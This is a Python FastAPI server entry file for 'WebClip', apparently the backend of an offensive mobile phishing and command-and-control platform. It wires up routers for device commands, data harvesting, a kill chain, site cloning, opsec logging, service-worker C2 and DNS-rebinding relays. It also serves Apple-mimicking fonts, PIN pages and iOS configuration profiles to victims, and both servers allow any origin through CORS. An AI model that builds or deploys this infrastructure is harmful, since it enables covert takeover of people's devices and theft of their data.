import asyncio, os
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, HTMLResponse
from backend.database import init_db
from backend.api.collection import router as collection_router
from backend.api.dashboard.auth_router import router as auth_router
from backend.api.dashboard.devices_router import router as devices_router
from backend.api.dashboard.events_router import router as events_router
from backend.api.dashboard.commands_router import router as commands_router
from backend.api.dashboard.push_router import router as push_router
from backend.api.dashboard.harvest_router import router as harvest_router
from backend.api.dashboard.versions_router import router as versions_router
from backend.api.dashboard.analytics_router import router as analytics_router
from backend.api.dashboard.geocode_router import router as geocode_router
from backend.api.dashboard.settings_router import router as settings_router
from backend.api.rebind_relay import router as rebind_relay_router
from backend.api.rebind_ws_relay_v2 import router as rebind_ws_router
from backend.api.dashboard.stream_router import router as stream_router
from backend.api.dashboard.killchain_router import router as killchain_router
from backend.api.dashboard.cloner_router import router as cloner_router
from backend.api.dashboard.opsec_router import router as opsec_router, log_request as opsec_log_request
from backend.api.dashboard.sw_c2_router import router as sw_c2_router
from backend.api.dashboard.webrtc_router import router as webrtc_router
from backend.api.dashboard.users_router import router as users_router
from backend.api.dashboard.studio_router import router as studio_router
from backend.config import settings

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_WEBCLIP_DIR = os.path.join(_ROOT, "webclip")
_DIST_DIR = os.path.join(_ROOT, "frontend-dist")


@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    yield

collection_app = FastAPI(title="WebClip Collection API", lifespan=lifespan)
collection_app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@collection_app.middleware("http")
async def no_cache_static(request: Request, call_next):
    response = await call_next(request)
    path = request.url.path
    if path in ("/", "/index.html", "/sw.js") or path.startswith("/app/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response
collection_app.include_router(collection_router, prefix="/api")
collection_app.include_router(rebind_relay_router, prefix="/api")
collection_app.include_router(rebind_ws_router, prefix="/api")
collection_app.include_router(studio_router, prefix="/api")

dashboard_app = FastAPI(title="WebClip Dashboard", lifespan=lifespan)
dashboard_app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@dashboard_app.middleware("http")
async def soc_request_logger(request: Request, call_next):
    forwarded = request.headers.get("X-Forwarded-For", "")
    real_ip   = request.headers.get("X-Real-IP", "")
    client_ip = (forwarded.split(",")[0].strip() if forwarded else real_ip) or (request.client.host if request.client else "")
    opsec_log_request(request.url.path, client_ip)
    return await call_next(request)
dashboard_app.include_router(auth_router, prefix="/api")
dashboard_app.include_router(users_router, prefix="/api")
dashboard_app.include_router(devices_router, prefix="/api")
dashboard_app.include_router(events_router, prefix="/api/devices")
dashboard_app.include_router(commands_router, prefix="/api/devices")
dashboard_app.include_router(push_router, prefix="/api")
dashboard_app.include_router(harvest_router, prefix="/api")
dashboard_app.include_router(versions_router, prefix="/api")
dashboard_app.include_router(analytics_router, prefix="/api")
dashboard_app.include_router(geocode_router, prefix="/api")
dashboard_app.include_router(settings_router, prefix="/api")
dashboard_app.include_router(stream_router, prefix="/api")
dashboard_app.include_router(rebind_relay_router, prefix="/api")
dashboard_app.include_router(rebind_ws_router, prefix="/api")
dashboard_app.include_router(killchain_router, prefix="/api")
dashboard_app.include_router(cloner_router, prefix="/api")
dashboard_app.include_router(opsec_router, prefix="/api")
dashboard_app.include_router(sw_c2_router, prefix="/api")
collection_app.include_router(sw_c2_router, prefix="/api")
dashboard_app.include_router(webrtc_router, prefix="/api")
dashboard_app.include_router(studio_router, prefix="/api")

# Serve React SPA — assets first, then SPA catch-all
if os.path.isdir(_DIST_DIR):
    _assets = os.path.join(_DIST_DIR, "assets")
    if os.path.isdir(_assets):
        dashboard_app.mount("/assets", StaticFiles(directory=_assets), name="dashboard-assets")

    @dashboard_app.get("/{full_path:path}", include_in_schema=False)
    async def serve_spa(full_path: str):
        return FileResponse(
            os.path.join(_DIST_DIR, "index.html"),
            headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"},
        )

# Serve WebClip from collection port
if os.path.isdir(_WEBCLIP_DIR):
    # Serve static assets (js, css, icons) from /app/ and /sw.js
    _webclip_static = StaticFiles(directory=_WEBCLIP_DIR)

    @collection_app.get("/sw.js", include_in_schema=False)
    async def serve_sw():
        return FileResponse(os.path.join(_WEBCLIP_DIR, "sw.js"),
                            media_type="application/javascript")

    @collection_app.get("/test-redirect.html", include_in_schema=False)
    async def serve_test_redirect():
        return FileResponse(os.path.join(_WEBCLIP_DIR, "test-redirect.html"),
                            media_type="text/html")

    @collection_app.get("/pin-preview.html", include_in_schema=False)
    async def serve_pin_preview():
        return FileResponse(os.path.join(_WEBCLIP_DIR, "pin-preview.html"),
                            media_type="text/html",
                            headers={"Cache-Control": "no-cache, no-store, must-revalidate"})

    def _font_response(fname):
        p = os.path.join(_WEBCLIP_DIR, fname)
        from fastapi import HTTPException
        if not os.path.exists(p): raise HTTPException(status_code=404)
        return FileResponse(p, media_type="font/otf", headers={"Cache-Control": "public, max-age=86400"})

    @collection_app.get("/SF-Pro-Display-Regular.otf", include_in_schema=False)
    async def font_sfd_reg(): return _font_response("SF-Pro-Display-Regular.otf")

    @collection_app.get("/SF-Pro-Display-Light.otf", include_in_schema=False)
    async def font_sfd_light(): return _font_response("SF-Pro-Display-Light.otf")

    @collection_app.get("/SF-Pro-Text-Regular.otf", include_in_schema=False)
    async def font_sft_reg(): return _font_response("SF-Pro-Text-Regular.otf")

    @collection_app.get("/SF-Pro-Text-Medium.otf", include_in_schema=False)
    async def font_sft_med(): return _font_response("SF-Pro-Text-Medium.otf")

    collection_app.mount("/app", StaticFiles(directory=os.path.join(_WEBCLIP_DIR, "app")), name="webclip-app")

# Serve mobileconfig dist files so the collection port can distribute them
_mobileconfig_dir = os.path.join(_ROOT, "dist")
if os.path.isdir(_mobileconfig_dir):
    collection_app.mount("/profiles", StaticFiles(directory=_mobileconfig_dir), name="profiles")

    @collection_app.get("/", include_in_schema=False)
    @collection_app.get("/index.html", include_in_schema=False)
    async def serve_webclip_index(request: Request):
        _idx = os.path.join(_WEBCLIP_DIR, "index.html")
        with open(_idx, encoding="utf-8") as fh:
            html = fh.read()
        # Derive server base URL
        base = settings.server_base_url or f"{request.url.scheme}://{request.headers.get('host', 'localhost')}"
        inject = (
            f'<script>'
            f'window.WEBCLIP_VAPID_KEY="{settings.vapid_public_key}";'
            f'window.WEBCLIP_SERVER="{base}";'
            f'</script>'
        )
        html = html.replace("<!-- __WEBCLIP_INJECT__ -->", inject)
        return HTMLResponse(html)


async def run():
    import uvicorn
    _ssl_cert = settings.ssl_certfile or None
    _ssl_key  = settings.ssl_keyfile or None
    s1 = uvicorn.Server(uvicorn.Config(
        collection_app, host="0.0.0.0", port=settings.collection_port, log_level="warning",
        ssl_certfile=_ssl_cert, ssl_keyfile=_ssl_key,
    ))
    s2 = uvicorn.Server(uvicorn.Config(
        dashboard_app, host="0.0.0.0", port=settings.dashboard_port, log_level="warning",
        ssl_certfile=_ssl_cert, ssl_keyfile=_ssl_key,
    ))
    await asyncio.gather(s1.serve(), s2.serve())

if __name__ == "__main__":
    asyncio.run(run())
